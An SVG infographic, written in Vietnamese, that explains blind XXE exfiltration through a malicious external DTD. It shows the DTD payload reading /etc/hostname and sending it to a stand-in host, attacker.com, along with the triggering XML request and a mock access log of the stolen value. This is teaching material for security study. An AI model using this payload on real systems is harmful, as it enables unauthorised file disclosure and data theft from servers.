<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 950 480" width="100%" height="100%">
  <defs>
    <linearGradient id="bgGrad3" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0a0e17"/>
      <stop offset="100%" stop-color="#121824"/>
    </linearGradient>
    <linearGradient id="cardGrad3" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1b2334"/>
      <stop offset="100%" stop-color="#141a27"/>
    </linearGradient>
    <linearGradient id="purpleGrad" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" stop-color="#b721ff"/>
      <stop offset="100%" stop-color="#21d4fd"/>
    </linearGradient>
  </defs>

  <rect width="950" height="480" rx="16" fill="url(#bgGrad3)" stroke="#273142" stroke-width="2"/>
  
  <rect x="30" y="24" width="8" height="28" rx="4" fill="url(#purpleGrad)"/>
  <text x="50" y="45" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="20" font-weight="700" fill="#ffffff">Blind XXE: Rút Trích Dữ Liệu Qua External DTD Độc Hại</text>
  <text x="50" y="70" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="13" fill="#8899ac">Sử dụng Parameter Entities (%) và máy chủ ngoại vi (Out-of-Band) khi server không in dữ liệu</text>

  <!-- Step 1: Attacker Server (External DTD) -->
  <g transform="translate(40, 100)">
    <rect width="260" height="340" rx="12" fill="url(#cardGrad3)" stroke="#b721ff" stroke-width="2"/>
    <rect x="0" y="0" width="260" height="40" rx="12" fill="#2d1c38"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#d2a8ff">Attacker Web Server</text>

    <rect x="15" y="55" width="230" height="140" rx="8" fill="#0d1117" stroke="#362244"/>
    <text x="25" y="78" font-family="monospace" font-size="11" font-weight="600" fill="#ff7b72">File: evil.dtd (Host sẵn)</text>
    <text x="25" y="100" font-family="monospace" font-size="10" fill="#79c0ff">&lt;!ENTITY % file</text>
    <text x="25" y="118" font-family="monospace" font-size="10" fill="#a5d6ff">  SYSTEM &quot;file:///etc/hostname&quot;&gt;</text>
    <text x="25" y="138" font-family="monospace" font-size="10" fill="#79c0ff">&lt;!ENTITY % eval &quot;&lt;!ENTITY</text>
    <text x="25" y="156" font-family="monospace" font-size="10" fill="#ffa657">  &amp;#x25; exfil SYSTEM</text>
    <text x="25" y="174" font-family="monospace" font-size="9" fill="#7ee787">  &#39;http://attacker.com/?d=%file;&#39;&gt;&quot;&gt;</text>
    <text x="25" y="188" font-family="monospace" font-size="10" fill="#d2a8ff">%eval; %exfil;</text>

    <!-- Access log view -->
    <rect x="15" y="210" width="230" height="110" rx="8" fill="#080b10" stroke="#252d3d"/>
    <text x="25" y="232" font-family="monospace" font-size="11" font-weight="600" fill="#00ff87">Access Log (Nhận File):</text>
    <text x="25" y="255" font-family="monospace" font-size="10" fill="#8b949e">GET /evil.dtd 200 OK</text>
    <text x="25" y="275" font-family="monospace" font-size="10" fill="#00ff87">GET /?d=ubuntu-prod-01</text>
    <text x="25" y="295" font-family="sans-serif" font-size="10" fill="#ffa657">-> Đã tóm được hostname!</text>
  </g>

  <!-- Flow in the middle: Target Server -->
  <g transform="translate(350, 100)">
    <rect width="250" height="340" rx="12" fill="url(#cardGrad3)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="250" height="40" rx="12" fill="#20293d"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="600" fill="#79c0ff">Vulnerable Target Server</text>

    <rect x="15" y="55" width="220" height="90" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="78" font-family="sans-serif" font-size="11" font-weight="600" fill="#ff7b72">1. Nhận XML request:</text>
    <text x="25" y="98" font-family="monospace" font-size="10" fill="#79c0ff">&lt;!ENTITY % dtd SYSTEM</text>
    <text x="25" y="116" font-family="monospace" font-size="10" fill="#ffa657">&quot;http://attacker/evil.dtd&quot;&gt;</text>
    <text x="25" y="134" font-family="monospace" font-size="10" fill="#79c0ff">%dtd;</text>

    <rect x="15" y="160" width="220" height="80" rx="8" fill="#161b22" stroke="#303c54"/>
    <text x="25" y="182" font-family="sans-serif" font-size="11" font-weight="600" fill="#e6edf3">2. Xử lý DTD:</text>
    <text x="25" y="202" font-family="sans-serif" font-size="10" fill="#8899ac">- Tải evil.dtd</text>
    <text x="25" y="220" font-family="sans-serif" font-size="10" fill="#8899ac">- Đọc /etc/hostname</text>

    <rect x="15" y="255" width="220" height="65" rx="8" fill="#1c2b29" stroke="#26453d"/>
    <text x="25" y="278" font-family="sans-serif" font-size="11" font-weight="600" fill="#00ff87">3. Gửi Exfiltration:</text>
    <text x="25" y="298" font-family="sans-serif" font-size="10" fill="#7ee787">Server tự động mang dữ liệu nhét vào URL gửi ra ngoài!</text>
  </g>

  <!-- Explanation card on the right -->
  <g transform="translate(650, 100)">
    <rect width="260" height="340" rx="12" fill="url(#cardGrad3)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="260" height="40" rx="12" fill="#20293d"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="600" fill="#ffffff">Tại sao cần External DTD?</text>

    <rect x="15" y="55" width="230" height="265" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="80" font-family="sans-serif" font-size="12" font-weight="700" fill="#f85149">Luật của chuẩn XML:</text>
    <text x="25" y="105" font-family="sans-serif" font-size="11" fill="#8899ac">Trong Internal DTD,</text>
    <text x="25" y="125" font-family="sans-serif" font-size="11" fill="#ff7b72">CẤM gọi Parameter Entity</text>
    <text x="25" y="145" font-family="sans-serif" font-size="11" fill="#ff7b72">lồng bên trong entity khác!</text>
    
    <line x1="25" y1="160" x2="225" y2="160" stroke="#21262d"/>
    <text x="25" y="185" font-family="sans-serif" font-size="12" font-weight="700" fill="#00ff87">Lách luật qua External DTD:</text>
    <text x="25" y="210" font-family="sans-serif" font-size="11" fill="#8899ac">Khi nạp từ một file .dtd ngoài,</text>
    <text x="25" y="230" font-family="sans-serif" font-size="11" fill="#8899ac">parser cho phép định nghĩa</text>
    <text x="25" y="250" font-family="sans-serif" font-size="11" fill="#a5d6ff">và lồng ghép các entity thoải mái</text>
    <text x="25" y="270" font-family="sans-serif" font-size="11" fill="#ffa657">(Dùng mã hex &amp;#x25; cho ký tự %)</text>
  </g>
</svg>